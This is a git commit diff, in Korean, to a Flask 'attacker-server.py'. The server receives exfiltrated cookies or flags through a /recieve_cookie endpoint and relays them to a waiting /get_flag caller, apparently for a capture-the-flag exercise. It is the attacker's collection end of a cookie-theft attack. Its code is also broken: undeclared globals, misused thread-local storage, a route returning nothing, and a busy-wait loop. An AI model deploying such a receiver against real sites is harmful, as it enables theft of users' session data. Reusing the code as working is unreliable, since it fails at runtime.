29e8cdddd4f5836228dd05e1d144504771d8566f
yang <hc1489@naver.com>
2025-03-23 18:52:40 +0900

    feat: 스레드 설정 추가

--- attacker-server.py
+++ attacker-server.py
@@ -4,11 +4,13 @@ import threading
 app = Flask(__name__)
 
 waiting_request = None
+waiting_thread = None
 
 def send_flag_response(flag):
     with app.app_context():
         if waiting_request:
-            print(f"Sending flag response to the receiver: {flag}")
+            print(f"flag가 전송되었습니다. : {flag}")
+            waiting_thread.result = flag
             waiting_request = False 
 
 @app.route('/get_flag', methods=['GET'])
@@ -17,21 +19,25 @@ def get_flag():
     print("Waiting for flag...")
 
     waiting_request = True
+    waiting_thread = threading.local()
+    waiting_thread.result = None
 
     while waiting_request:
         pass
 
-    return jsonify({"message": "Flag received and sent to the receiver."}), 200
+    return jsonify({"flag": waiting_thread.result}), 200
 
 @app.route('/recieve_cookie', methods=['GET'])
 def recieve_cookie():
     flag = request.args.get('flag')
+    print(f"서버가 flag를 수신했했습니다. : {flag}")
     
     if not flag:
-        return jsonify({"error": "No flag received"}), 400
+      print("잘못된 flag 입니다.")
+      return
 
     threading.Thread(target=send_flag_response, args=(flag,)).start()
-    return jsonify({"message": "Flag received, response will be sent to the receiver."}), 200
+    return
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
